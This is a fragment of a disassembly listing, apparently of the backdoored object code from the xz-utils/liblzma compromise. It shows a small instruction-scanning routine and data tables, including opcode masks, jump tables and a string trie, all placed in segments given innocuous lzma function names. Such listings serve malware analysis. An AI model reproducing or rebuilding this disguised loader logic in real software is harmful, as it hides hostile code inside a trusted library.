.text.lzma_block_total_siza:000000000000AC70
.text.lzma_block_total_siza:000000000000AC70 ; Segment type: Pure code
.text.lzma_block_total_siza:000000000000AC70 ; Segment permissions: Read/Execute
.text.lzma_block_total_siza:000000000000AC70 _text_lzma_block_total_siza segment para public 'CODE' use64
.text.lzma_block_total_siza:000000000000AC70                 assume cs:_text_lzma_block_total_siza
.text.lzma_block_total_siza:000000000000AC70                 ;org 0AC70h
.text.lzma_block_total_siza:000000000000AC70                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_total_siza:000000000000AC70
.text.lzma_block_total_siza:000000000000AC70 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_total_siza:000000000000AC70
.text.lzma_block_total_siza:000000000000AC70
.text.lzma_block_total_siza:000000000000AC70 ; __int64 __fastcall Llzma_block_total_size_0(unsigned __int64, unsigned __int64, __int64)
.text.lzma_block_total_siza:000000000000AC70 _Llzma_block_total_size_0 proc near     ; CODE XREF: apply_method_2+6E↑p
.text.lzma_block_total_siza:000000000000AC70                 endbr64
.text.lzma_block_total_siza:000000000000AC74                 test    rdx, rdx
.text.lzma_block_total_siza:000000000000AC77                 jz      short loc_ACF3
.text.lzma_block_total_siza:000000000000AC79                 push    r12
.text.lzma_block_total_siza:000000000000AC7B                 mov     r12, rsi
.text.lzma_block_total_siza:000000000000AC7E                 push    rbp
.text.lzma_block_total_siza:000000000000AC7F                 mov     rbp, 505050500000505h
.text.lzma_block_total_siza:000000000000AC89                 push    rbx
.text.lzma_block_total_siza:000000000000AC8A                 mov     rbx, rdx
.text.lzma_block_total_siza:000000000000AC8D
.text.lzma_block_total_siza:000000000000AC8D loc_AC8D:                               ; CODE XREF: _Llzma_block_total_size_0+77↓j
.text.lzma_block_total_siza:000000000000AC8D                 cmp     rdi, r12
.text.lzma_block_total_siza:000000000000AC90                 jb      short loc_AC96
.text.lzma_block_total_siza:000000000000AC92
.text.lzma_block_total_siza:000000000000AC92 loc_AC92:                               ; CODE XREF: _Llzma_block_total_size_0+36↓j
.text.lzma_block_total_siza:000000000000AC92                 xor     eax, eax
.text.lzma_block_total_siza:000000000000AC94                 jmp     short loc_ACEE
.text.lzma_block_total_siza:000000000000AC96 ; ---------------------------------------------------------------------------
.text.lzma_block_total_siza:000000000000AC96
.text.lzma_block_total_siza:000000000000AC96 loc_AC96:                               ; CODE XREF: _Llzma_block_total_size_0+20↑j
.text.lzma_block_total_siza:000000000000AC96                 mov     rsi, rdi
.text.lzma_block_total_siza:000000000000AC99                 mov     rdx, r12
.text.lzma_block_total_siza:000000000000AC9C                 mov     rdi, rbx
.text.lzma_block_total_siza:000000000000AC9F                 call    code_dasm       ; PIC mode
.text.lzma_block_total_siza:000000000000ACA4                 test    eax, eax
.text.lzma_block_total_siza:000000000000ACA6                 jz      short loc_AC92
.text.lzma_block_total_siza:000000000000ACA8                 mov     ecx, [rbx+28h]
.text.lzma_block_total_siza:000000000000ACAB                 mov     eax, ecx
.text.lzma_block_total_siza:000000000000ACAD                 and     eax, 0FFFFFFFDh
.text.lzma_block_total_siza:000000000000ACB0                 cmp     eax, 109h
.text.lzma_block_total_siza:000000000000ACB5                 jz      short loc_ACCC
.text.lzma_block_total_siza:000000000000ACB7                 sub     ecx, 81h
.text.lzma_block_total_siza:000000000000ACBD                 cmp     ecx, 3Ah ; ':'
.text.lzma_block_total_siza:000000000000ACC0                 ja      short loc_ACE0
.text.lzma_block_total_siza:000000000000ACC2                 mov     rax, rbp
.text.lzma_block_total_siza:000000000000ACC5                 shr     rax, cl
.text.lzma_block_total_siza:000000000000ACC8                 test    al, 1
.text.lzma_block_total_siza:000000000000ACCA                 jz      short loc_ACE0
.text.lzma_block_total_siza:000000000000ACCC
.text.lzma_block_total_siza:000000000000ACCC loc_ACCC:                               ; CODE XREF: _Llzma_block_total_size_0+45↑j
.text.lzma_block_total_siza:000000000000ACCC                 test    word ptr [rbx+10h], 0F80h
.text.lzma_block_total_siza:000000000000ACD2                 jnz     short loc_ACE0
.text.lzma_block_total_siza:000000000000ACD4                 test    byte ptr [rbx+1Bh], 5
.text.lzma_block_total_siza:000000000000ACD8                 jnz     short loc_ACE0
.text.lzma_block_total_siza:000000000000ACDA                 cmp     byte ptr [rbx+1Dh], 3
.text.lzma_block_total_siza:000000000000ACDE                 jz      short loc_ACE9
.text.lzma_block_total_siza:000000000000ACE0
.text.lzma_block_total_siza:000000000000ACE0 loc_ACE0:                               ; CODE XREF: _Llzma_block_total_size_0+50↑j
.text.lzma_block_total_siza:000000000000ACE0                                         ; _Llzma_block_total_size_0+5A↑j ...
.text.lzma_block_total_siza:000000000000ACE0                 mov     rdi, [rbx+8]
.text.lzma_block_total_siza:000000000000ACE4                 add     rdi, [rbx]
.text.lzma_block_total_siza:000000000000ACE7                 jmp     short loc_AC8D
.text.lzma_block_total_siza:000000000000ACE9 ; ---------------------------------------------------------------------------
.text.lzma_block_total_siza:000000000000ACE9
.text.lzma_block_total_siza:000000000000ACE9 loc_ACE9:                               ; CODE XREF: _Llzma_block_total_size_0+6E↑j
.text.lzma_block_total_siza:000000000000ACE9                 mov     eax, 1
.text.lzma_block_total_siza:000000000000ACEE
.text.lzma_block_total_siza:000000000000ACEE loc_ACEE:                               ; CODE XREF: _Llzma_block_total_size_0+24↑j
.text.lzma_block_total_siza:000000000000ACEE                 pop     rbx
.text.lzma_block_total_siza:000000000000ACEF                 pop     rbp
.text.lzma_block_total_siza:000000000000ACF0                 pop     r12
.text.lzma_block_total_siza:000000000000ACF2                 retn
.text.lzma_block_total_siza:000000000000ACF3 ; ---------------------------------------------------------------------------
.text.lzma_block_total_siza:000000000000ACF3
.text.lzma_block_total_siza:000000000000ACF3 loc_ACF3:                               ; CODE XREF: _Llzma_block_total_size_0+7↑j
.text.lzma_block_total_siza:000000000000ACF3                 xor     eax, eax
.text.lzma_block_total_siza:000000000000ACF5                 retn
.text.lzma_block_total_siza:000000000000ACF5 _Llzma_block_total_size_0 endp
.text.lzma_block_total_siza:000000000000ACF5
.text.lzma_block_total_siza:000000000000ACF5 _text_lzma_block_total_siza ends
.text.lzma_block_total_siza:000000000000ACF5
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 ; ===========================================================================
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 ; Segment type: Pure data
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 ; Segment permissions: Read
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 _rodata_MASK_TO_BIT_NUMBER0 segment align_32 public 'CONST' use64
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00                 assume cs:_rodata_MASK_TO_BIT_NUMBER0
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00                 ;org 0AD00h
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 ; unsigned __int8 byte_AD00[32]
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00 byte_AD00       db 0FFh, 0Fh, 0B1h, 70h, 3Fh, 0Fh, 0BFh, 0FFh, 3, 7 dup(0)
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00                                         ; DATA XREF: code_dasm+539↑o
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD00                 db 7, 8 dup(0), 3Fh, 0, 0F8h, 2 dup(0), 4Fh, 0
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD20 ; unsigned __int8 byte_AD20[32]
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD20 byte_AD20       db 0FFh, 0Fh, 0B1h, 70h, 3Fh, 0Fh, 0BFh, 0FFh, 3, 7 dup(0)
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD20                                         ; DATA XREF: code_dasm+512↑o
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD20                 db 7, 8 dup(0), 3Fh, 0, 0F8h, 2 dup(0), 3, 0
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD40 ; unsigned __int8 byte_AD40[32]
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD40 byte_AD40       db 0Fh, 20h, 2 dup(0FFh), 0Fh, 0FFh, 2 dup(0), 6 dup(0FFh)
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD40                                         ; DATA XREF: code_dasm+491↑o
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD40                 db 7Fh, 0F3h, 2 dup(0), 2 dup(0FFh), 38h, 0F8h, 0FFh, 0FEh
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD40                 db 0FFh, 0, 5 dup(0FFh), 7Fh
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60 ; unsigned __int8 byte_AD60[32]
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60 byte_AD60       db 0EFh, 6Bh, 2 dup(0FFh), 0Fh, 0FFh, 0BFh, 0, 7 dup(0FFh)
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60                                         ; DATA XREF: code_dasm+3EB↑o
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60                 db 0F3h, 4 dup(0FFh), 3Fh, 2 dup(0FFh), 0FEh, 7 dup(0FFh)
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60                 db 7Fh
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60 _rodata_MASK_TO_BIT_NUMBER0 ends
.rodata.MASK_TO_BIT_NUMBER0:000000000000AD60
.rodata.BRANCH_TABLE0:000000000000AD80 ; ===========================================================================
.rodata.BRANCH_TABLE0:000000000000AD80
.rodata.BRANCH_TABLE0:000000000000AD80 ; Segment type: Pure data
.rodata.BRANCH_TABLE0:000000000000AD80 ; Segment permissions: Read
.rodata.BRANCH_TABLE0:000000000000AD80 _rodata_BRANCH_TABLE0 segment align_32 public 'CONST' use64
.rodata.BRANCH_TABLE0:000000000000AD80                 assume cs:_rodata_BRANCH_TABLE0
.rodata.BRANCH_TABLE0:000000000000AD80                 ;org 0AD80h
.rodata.BRANCH_TABLE0:000000000000AD80 ; unsigned __int8 byte_AD80[32]
.rodata.BRANCH_TABLE0:000000000000AD80 byte_AD80       db 8 dup(0Fh), 4 dup(0), 8, 0Ah, 2 dup(0), 2 dup(0FFh)
.rodata.BRANCH_TABLE0:000000000000AD80                                         ; DATA XREF: code_dasm:loc_33C↑o
.rodata.BRANCH_TABLE0:000000000000AD80                 db 6 dup(0), 0C3h, 0, 0Fh, 0FFh, 2 dup(0), 2 dup(0C0h)
.rodata.BRANCH_TABLE0:000000000000ADA0 ; unsigned __int8 byte_ADA0[32]
.rodata.BRANCH_TABLE0:000000000000ADA0 byte_ADA0       db 8 dup(0C0h), 2 dup(0FFh), 2 dup(0), 37h, 6 dup(0), 4
.rodata.BRANCH_TABLE0:000000000000ADA0                                         ; DATA XREF: code_dasm+207↑o
.rodata.BRANCH_TABLE0:000000000000ADA0                 db 4 dup(0), 30h, 40h, 70h, 2 dup(0), 4, 0Dh, 0
.rodata.BRANCH_TABLE0:000000000000ADA0 _rodata_BRANCH_TABLE0 ends
.rodata.BRANCH_TABLE0:000000000000ADA0
.rodata.get_literal_prica:000000000000ADC0 ; ===========================================================================
.rodata.get_literal_prica:000000000000ADC0
.rodata.get_literal_prica:000000000000ADC0 ; Segment type: Pure data
.rodata.get_literal_prica:000000000000ADC0 ; Segment permissions: Read
.rodata.get_literal_prica:000000000000ADC0 _rodata_get_literal_prica segment dword public 'CONST' use64
.rodata.get_literal_prica:000000000000ADC0                 assume cs:_rodata_get_literal_prica
.rodata.get_literal_prica:000000000000ADC0                 ;org 0ADC0h
.rodata.get_literal_prica:000000000000ADC0 jpt_156D        dd offset loc_15E8 - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                                         ; DATA XREF: parse_elf+127↑o
.rodata.get_literal_prica:000000000000ADC0                                         ; parse_elf+1A6↑r
.rodata.get_literal_prica:000000000000ADC0                 dd offset loc_1646 - 0ADC0h ; jump table for switch statement
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset loc_1638 - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset def_156D - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset loc_161F - 0ADC0h
.rodata.get_literal_prica:000000000000ADC0                 dd offset loc_1600 - 0ADC0h
.rodata.get_literal_prica:000000000000ADF8 jpt_1577        dd offset loc_160F - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8                                         ; DATA XREF: parse_elf+130↑o
.rodata.get_literal_prica:000000000000ADF8                                         ; parse_elf:loc_1570↑r
.rodata.get_literal_prica:000000000000ADF8                 dd offset def_156D - 0ADF8h ; jump table for switch statement
.rodata.get_literal_prica:000000000000ADF8                 dd offset def_156D - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8                 dd offset loc_15D0 - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8                 dd offset loc_15DC - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8                 dd offset loc_15F4 - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8                 dd offset loc_1617 - 0ADF8h
.rodata.get_literal_prica:000000000000ADF8 _rodata_get_literal_prica ends
.rodata.get_literal_prica:000000000000ADF8
.rodata.lzma2_decode:000000000000AE18 ; ===========================================================================
.rodata.lzma2_decode:000000000000AE18
.rodata.lzma2_decode:000000000000AE18 ; Segment type: Pure data
.rodata.lzma2_decode:000000000000AE18 ; Segment permissions: Read
.rodata.lzma2_decode:000000000000AE18 _rodata_lzma2_decode segment qword public 'CONST' use64
.rodata.lzma2_decode:000000000000AE18                 assume cs:_rodata_lzma2_decode
.rodata.lzma2_decode:000000000000AE18                 ;org 0AE18h
.rodata.lzma2_decode:000000000000AE18 _Lx86_coder_destroy dq 0                ; DATA XREF: get_ehdr_address+4↑o
.rodata.lzma2_decode:000000000000AE18                                         ; .rodata.rc_encode:Lx86_coder_off↓o
.rodata.lzma2_decode:000000000000AE18 _rodata_lzma2_decode ends
.rodata.lzma2_decode:000000000000AE18
.rodata.lzma_lzma_encode:000000000000AE20 ; ===========================================================================
.rodata.lzma_lzma_encode:000000000000AE20
.rodata.lzma_lzma_encode:000000000000AE20 ; [00000008 BYTES: COLLAPSED SEGMENT _rodata_lzma_lzma_encode. PRESS CTRL-NUMPAD+ TO EXPAND]
.rodata.lzma_lzma_encodd:000000000000AE30 ; ===========================================================================
.rodata.lzma_lzma_encodd:000000000000AE30
.rodata.lzma_lzma_encodd:000000000000AE30 ; Segment type: Pure data
.rodata.lzma_lzma_encodd:000000000000AE30 ; Segment permissions: Read
.rodata.lzma_lzma_encodd:000000000000AE30 _rodata_lzma_lzma_encodd segment para public 'CONST' use64
.rodata.lzma_lzma_encodd:000000000000AE30                 assume cs:_rodata_lzma_lzma_encodd
.rodata.lzma_lzma_encodd:000000000000AE30                 ;org 0AE30h
.rodata.lzma_lzma_encodd:000000000000AE30                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE38                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE40                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE48                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE50                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE58                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE60                 dq 0
.rodata.lzma_lzma_encodd:000000000000AE68                 db    0
.rodata.lzma_lzma_encodd:000000000000AE69                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6A                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6B                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6C                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6D                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6E                 db    0
.rodata.lzma_lzma_encodd:000000000000AE6F                 db    0
.rodata.lzma_lzma_encodd:000000000000AE70                 db    0
.rodata.lzma_lzma_encodd:000000000000AE71                 db    0
.rodata.lzma_lzma_encodd:000000000000AE72                 db    0
.rodata.lzma_lzma_encodd:000000000000AE73                 db    0
.rodata.lzma_lzma_encodd:000000000000AE74                 db    0
.rodata.lzma_lzma_encodd:000000000000AE75                 db    0
.rodata.lzma_lzma_encodd:000000000000AE76                 db    0
.rodata.lzma_lzma_encodd:000000000000AE77                 db    0
.rodata.lzma_lzma_encodd:000000000000AE78                 db    0
.rodata.lzma_lzma_encodd:000000000000AE79                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7A                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7B                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7C                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7D                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7E                 db    0
.rodata.lzma_lzma_encodd:000000000000AE7F                 db    0
.rodata.lzma_lzma_encodd:000000000000AE80                 db    0
.rodata.lzma_lzma_encodd:000000000000AE81                 db    0
.rodata.lzma_lzma_encodd:000000000000AE82                 db    0
.rodata.lzma_lzma_encodd:000000000000AE83                 db    0
.rodata.lzma_lzma_encodd:000000000000AE84                 db    0
.rodata.lzma_lzma_encodd:000000000000AE85                 db    0
.rodata.lzma_lzma_encodd:000000000000AE86                 db    0
.rodata.lzma_lzma_encodd:000000000000AE87                 db    0
.rodata.lzma_lzma_encodd:000000000000AE88                 db    0
.rodata.lzma_lzma_encodd:000000000000AE89                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8A                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8B                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8C                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8D                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8E                 db    0
.rodata.lzma_lzma_encodd:000000000000AE8F                 db    0
.rodata.lzma_lzma_encodd:000000000000AE90                 db    0
.rodata.lzma_lzma_encodd:000000000000AE91                 db    0
.rodata.lzma_lzma_encodd:000000000000AE92                 db    0
.rodata.lzma_lzma_encodd:000000000000AE93                 db    0
.rodata.lzma_lzma_encodd:000000000000AE94                 db    0
.rodata.lzma_lzma_encodd:000000000000AE95                 db    0
.rodata.lzma_lzma_encodd:000000000000AE96                 db    0
.rodata.lzma_lzma_encodd:000000000000AE97                 db    0
.rodata.lzma_lzma_encodd:000000000000AE98                 db    0
.rodata.lzma_lzma_encodd:000000000000AE99                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9A                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9B                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9C                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9D                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9E                 db    0
.rodata.lzma_lzma_encodd:000000000000AE9F                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA0                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA1                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA2                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA3                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA4                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA5                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA6                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA7                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA8                 db    0
.rodata.lzma_lzma_encodd:000000000000AEA9                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAA                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAB                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAC                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAD                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAE                 db    0
.rodata.lzma_lzma_encodd:000000000000AEAF                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB0                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB1                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB2                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB3                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB4                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB5                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB6                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB7                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB8                 db    0
.rodata.lzma_lzma_encodd:000000000000AEB9                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBA                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBB                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBC                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBD                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBE                 db    0
.rodata.lzma_lzma_encodd:000000000000AEBF                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC0                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC1                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC2                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC3                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC4                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC5                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC6                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC7                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC8                 db    0
.rodata.lzma_lzma_encodd:000000000000AEC9                 db    0
.rodata.lzma_lzma_encodd:000000000000AECA                 db    0
.rodata.lzma_lzma_encodd:000000000000AECB                 db    0
.rodata.lzma_lzma_encodd:000000000000AECC                 db    0
.rodata.lzma_lzma_encodd:000000000000AECD                 db    0
.rodata.lzma_lzma_encodd:000000000000AECE                 db    0
.rodata.lzma_lzma_encodd:000000000000AECF                 db    0
.rodata.lzma_lzma_encodd:000000000000AECF _rodata_lzma_lzma_encodd ends
.rodata.lzma_lzma_encodd:000000000000AECF
.rodata.lzip_decode0:000000000000AEE0 ; ===========================================================================
.rodata.lzip_decode0:000000000000AEE0
.rodata.lzip_decode0:000000000000AEE0 ; Segment type: Pure data
.rodata.lzip_decode0:000000000000AEE0 ; Segment permissions: Read
.rodata.lzip_decode0:000000000000AEE0 _rodata_lzip_decode0 segment align_32 public 'CONST' use64
.rodata.lzip_decode0:000000000000AEE0                 assume cs:_rodata_lzip_decode0
.rodata.lzip_decode0:000000000000AEE0                 ;org 0AEE0h
.rodata.lzip_decode0:000000000000AEE0                 public trie_table1
.rodata.lzip_decode0:000000000000AEE0 trie_table1     db    4                 ; DATA XREF: table_get:loc_A8EF↑o
.rodata.lzip_decode0:000000000000AEE1                 db    0
.rodata.lzip_decode0:000000000000AEE2                 db  10h
.rodata.lzip_decode0:000000000000AEE3                 db    8
.rodata.lzip_decode0:000000000000AEE4                 db    3
.rodata.lzip_decode0:000000000000AEE5                 db    0
.rodata.lzip_decode0:000000000000AEE6                 db    0
.rodata.lzip_decode0:000000000000AEE7                 db    0
.rodata.lzip_decode0:000000000000AEE8                 db    3
.rodata.lzip_decode0:000000000000AEE9                 db    0
.rodata.lzip_decode0:000000000000AEEA                 db    0
.rodata.lzip_decode0:000000000000AEEB                 db    0
.rodata.lzip_decode0:000000000000AEEC                 db    3
.rodata.lzip_decode0:000000000000AEED                 db    0
.rodata.lzip_decode0:000000000000AEEE                 db    0
.rodata.lzip_decode0:000000000000AEEF                 db    0
.rodata.lzip_decode0:000000000000AEF0                 db    4
.rodata.lzip_decode0:000000000000AEF1                 db    0
.rodata.lzip_decode0:000000000000AEF2                 db  78h ; x
.rodata.lzip_decode0:000000000000AEF3                 db    6
.rodata.lzip_decode0:000000000000AEF4                 db    3
.rodata.lzip_decode0:000000000000AEF5                 db    0
.rodata.lzip_decode0:000000000000AEF6                 db    0
.rodata.lzip_decode0:000000000000AEF7                 db    0
.rodata.lzip_decode0:000000000000AEF8                 db    3
.rodata.lzip_decode0:000000000000AEF9                 db    0
.rodata.lzip_decode0:000000000000AEFA                 db    0
.rodata.lzip_decode0:000000000000AEFB                 db    0
.rodata.lzip_decode0:000000000000AEFC                 db  30h ; 0
.rodata.lzip_decode0:000000000000AEFD                 db    0
.rodata.lzip_decode0:000000000000AEFE                 db  0Ch
.rodata.lzip_decode0:000000000000AEFF                 db    0
.rodata.lzip_decode0:000000000000AF00                 db    3
.rodata.lzip_decode0:000000000000AF01                 db    0
.rodata.lzip_decode0:000000000000AF02                 db    0
.rodata.lzip_decode0:000000000000AF03                 db    0
.rodata.lzip_decode0:000000000000AF04                 db    4
.rodata.lzip_decode0:000000000000AF05                 db    0
.rodata.lzip_decode0:000000000000AF06                 db 0D8h
.rodata.lzip_decode0:000000000000AF07                 db    0
.rodata.lzip_decode0:000000000000AF08                 db    3
.rodata.lzip_decode0:000000000000AF09                 db    0
.rodata.lzip_decode0:000000000000AF0A                 db    0
.rodata.lzip_decode0:000000000000AF0B                 db    0
.rodata.lzip_decode0:000000000000AF0C                 db    3
.rodata.lzip_decode0:000000000000AF0D                 db    0
.rodata.lzip_decode0:000000000000AF0E                 db    0
.rodata.lzip_decode0:000000000000AF0F                 db    0
.rodata.lzip_decode0:000000000000AF10                 db    3
.rodata.lzip_decode0:000000000000AF11                 db    0
.rodata.lzip_decode0:000000000000AF12                 db    0
.rodata.lzip_decode0:000000000000AF13                 db    0
.rodata.lzip_decode0:000000000000AF14                 db    3
.rodata.lzip_decode0:000000000000AF15                 db    0
.rodata.lzip_decode0:000000000000AF16                 db    0
.rodata.lzip_decode0:000000000000AF17                 db    0
.rodata.lzip_decode0:000000000000AF18                 db    3
.rodata.lzip_decode0:000000000000AF19                 db    0
.rodata.lzip_decode0:000000000000AF1A                 db    0
.rodata.lzip_decode0:000000000000AF1B                 db    0
.rodata.lzip_decode0:000000000000AF1C                 db  43h ; C
.rodata.lzip_decode0:000000000000AF1D                 db    0
.rodata.lzip_decode0:000000000000AF1E                 db    0
.rodata.lzip_decode0:000000000000AF1F                 db    0
.rodata.lzip_decode0:000000000000AF20                 db  32h ; 2
.rodata.lzip_decode0:000000000000AF21                 db    0
.rodata.lzip_decode0:000000000000AF22                 db    0
.rodata.lzip_decode0:000000000000AF23                 db    0
.rodata.lzip_decode0:000000000000AF24                 db    3
.rodata.lzip_decode0:000000000000AF25                 db    0
.rodata.lzip_decode0:000000000000AF26                 db    0
.rodata.lzip_decode0:000000000000AF27                 db    0
.rodata.lzip_decode0:000000000000AF28                 db    3
.rodata.lzip_decode0:000000000000AF29                 db    0
.rodata.lzip_decode0:000000000000AF2A                 db    0
.rodata.lzip_decode0:000000000000AF2B                 db    0
.rodata.lzip_decode0:000000000000AF2C                 db  13h
.rodata.lzip_decode0:000000000000AF2D                 db    1
.rodata.lzip_decode0:000000000000AF2E                 db    0
.rodata.lzip_decode0:000000000000AF2F                 db    0
.rodata.lzip_decode0:000000000000AF30                 db  92h
.rodata.lzip_decode0:000000000000AF31                 db    0
.rodata.lzip_decode0:000000000000AF32                 db    0
.rodata.lzip_decode0:000000000000AF33                 db    0
.rodata.lzip_decode0:000000000000AF34                 db  12h
.rodata.lzip_decode0:000000000000AF35                 db    0
.rodata.lzip_decode0:000000000000AF36                 db    0
.rodata.lzip_decode0:000000000000AF37                 db    0
.rodata.lzip_decode0:000000000000AF38                 db  42h ; B
.rodata.lzip_decode0:000000000000AF39                 db    0
.rodata.lzip_decode0:000000000000AF3A                 db    0
.rodata.lzip_decode0:000000000000AF3B                 db    0
.rodata.lzip_decode0:000000000000AF3C                 db  93h
.rodata.lzip_decode0:000000000000AF3D                 db    0
.rodata.lzip_decode0:000000000000AF3E                 db    0
.rodata.lzip_decode0:000000000000AF3F                 db    0
.rodata.lzip_decode0:000000000000AF40                 db  62h ; b
.rodata.lzip_decode0:000000000000AF41                 db    0
.rodata.lzip_decode0:000000000000AF42                 db    0
.rodata.lzip_decode0:000000000000AF43                 db    0
.rodata.lzip_decode0:000000000000AF44                 db 0B3h
.rodata.lzip_decode0:000000000000AF45                 db    0
.rodata.lzip_decode0:000000000000AF46                 db    0
.rodata.lzip_decode0:000000000000AF47                 db    0
.rodata.lzip_decode0:000000000000AF48                 db 0B2h
.rodata.lzip_decode0:000000000000AF49                 db    0
.rodata.lzip_decode0:000000000000AF4A                 db    0
.rodata.lzip_decode0:000000000000AF4B                 db    0
.rodata.lzip_decode0:000000000000AF4C                 db    3
.rodata.lzip_decode0:000000000000AF4D                 db    0
.rodata.lzip_decode0:000000000000AF4E                 db    0
.rodata.lzip_decode0:000000000000AF4F                 db    0
.rodata.lzip_decode0:000000000000AF50                 db    3
.rodata.lzip_decode0:000000000000AF51                 db    0
.rodata.lzip_decode0:000000000000AF52                 db    0
.rodata.lzip_decode0:000000000000AF53                 db    0
.rodata.lzip_decode0:000000000000AF54                 db  93h
.rodata.lzip_decode0:000000000000AF55                 db    0
.rodata.lzip_decode0:000000000000AF56                 db    0
.rodata.lzip_decode0:000000000000AF57                 db    0
.rodata.lzip_decode0:000000000000AF58                 db  42h ; B
.rodata.lzip_decode0:000000000000AF59                 db    0
.rodata.lzip_decode0:000000000000AF5A                 db    0
.rodata.lzip_decode0:000000000000AF5B                 db    0
.rodata.lzip_decode0:000000000000AF5C                 db 0C3h
.rodata.lzip_decode0:000000000000AF5D                 db    0
.rodata.lzip_decode0:000000000000AF5E                 db    0
